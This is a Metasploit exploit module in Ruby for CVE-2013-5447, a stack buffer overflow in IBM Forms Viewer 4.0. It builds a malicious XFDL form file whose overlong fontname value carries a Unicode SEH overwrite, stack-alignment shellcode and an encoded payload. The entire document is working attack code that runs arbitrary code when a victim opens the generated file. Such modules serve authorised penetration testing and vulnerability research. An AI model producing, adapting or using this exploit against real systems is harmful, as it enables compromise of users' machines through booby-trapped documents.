# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rexml/document&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include REXML
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;IBM Forms Viewer Unicode Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack-based buffer overflow in IBM Forms Viewer. The vulnerability
        is due to a dangerous usage of strcpy-like function, and occurs while parsing malformed
        XFDL files, with a long fontname value. This module has been tested successfully on IBM
        Forms Viewer 4.0 on Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039;, # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-5447&#039; ],
          [ &#039;OSVDB&#039;, &#039;100732&#039; ],
          [ &#039;ZDI&#039;, &#039;13-274&#039; ],
          [ &#039;URL&#039;, &#039;http://www-01.ibm.com/support/docview.wss?uid=swg21657500&#039; ],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;          => 3000,
          &#039;EncoderType&#039;    => Msf::Encoder::Type::AlphanumUnicodeMixed,
          &#039;EncoderOptions&#039; =>
            {
              &#039;BufferRegister&#039; => &#039;ECX&#039;,
              &#039;BufferOffset&#039; => 10
            },
          &#039;BadChars&#039;       => (0x00..0x08).to_a.pack("C*") + (0x0b..0x1f).to_a.pack("C*") +"\x26\x3c" + (0x80..0xff).to_a.pack("C*"),
          &#039;DisableNops&#039;    => true,
          # Fix the stack before the payload is executed, so we avoid
          # windows exceptions due to alignment
          &#039;Prepend&#039;        =>
              "\x64\xa1\x18\x00\x00\x00" + # mov eax, fs:[0x18]
              "\x83\xC0\x08"             + # add eax, byte 8
              "\x8b\x20"                 + # mov esp, [eax]
              "\x81\xC4\x30\xF8\xFF\xFF"   # add esp, -2000
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;IBM Forms Viewer 4.0 / Windows XP SP3 / Windows 7 SP1&#039;,
            # masqform.exe 8.0.0.266
            {
              &#039;Ret&#039;    => 0x4c30, # p/p/r unicode from masqform.exe
              &#039;Nop&#039;    => 0x47, # 004700 => add [edi+0x0],al
              &#039;Offset&#039; => 62
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Dec 05 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.xfdl&#039;]),
      ], self.class)
  end

  def generate_xfdl
    xml = Document.new

    # XFDL
    xfdl = xml.add_element("XFDL", {
      &#039;xmlns:custom&#039;   => "http://www.ibm.com/xmlns/prod/XFDL/Custom",
      &#039;xmlns:designer&#039; => "http://www.ibm.com/xmlns/prod/workplace/forms/designer/2.6",
      &#039;xmlns:ev&#039;       => "http://www.w3.org/2001/xml-events",
      &#039;xmlns:xfdl&#039;     => "http://www.ibm.com/xmlns/prod/XFDL/7.5",
      &#039;xmlns:xforms&#039;   => "http://www.w3.org/2002/xforms",
      &#039;xmlns&#039;          => "http://www.ibm.com/xmlns/prod/XFDL/7.5",
      &#039;xmlns:xsd&#039;      => "http://www.w3.org/2001/XMLSchema",
      &#039;xmlns:xsi&#039;      => "http://www.w3.org/2001/XMLSchema-instance"
    })

    # XFDL => globalpage
    xdfl_global_page = xfdl.add_element("globalpage", {
      "sid" => "global"
    })
    global = xdfl_global_page.add_element("global", {
      "sid" => "global"
    })
    designer_date = global.add_element("designer:date")
    designer_date.text = "20060615"
    form_id = global.add_element("formid")
    form_id.add_element("title")
    serial_number = form_id.add_element("serialnumber")
    serial_number.text = "A6D5583E2AD0D54E:-72C430D4:10BD8923059:-8000"
    version_form = form_id.add_element("version")
    version_form.text = "1"

    # XFDL => page
    page = xfdl.add_element("page", {
      "sid" => "PAGE1"
    })

    # XFDL => page => global
    page_global = page.add_element("global", {
      "sid" => "global"
    })
    label_page = page_global.add_element("label")
    label_page.text = "PAGE1"

    # XFDL => page => label
    label = page.add_element("label", {
      "sid" => "title"
    })
    item_location = label.add_element("itemlocation")
    x = item_location.add_element("x")
    x.text = "20"
    y = item_location.add_element("y")
    y.text = "0"
    value = label.add_element("value", {
      "compute" => "global.global.custom:formTitle"
    })
    value.text = rand_text_alpha(10)
    font_info = label.add_element("fontinfo")
    font_name = font_info.add_element("fontname")
    font_name.text = "MSF_REPLACE"
    xml.to_s
  end


  def exploit
    sploit = rand_text_alpha(target[&#039;Offset&#039;])
    sploit << "\x61\x62"             # nseh # NSEH # popad (61) + nop compatible with unicode (add [edx+0x0],ah # 006200)
    sploit << [target.ret].pack("v") # seh # ppr
    sploit << [target[&#039;Nop&#039;]].pack("C")
    sploit << payload.encoded
    sploit << rand_text_alpha(4096)  # make it crash

    xfdl = generate_xfdl.gsub(/MSF_REPLACE/, sploit) # To avoid rexml html encoding

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")

    file_create(xfdl)
  end

end

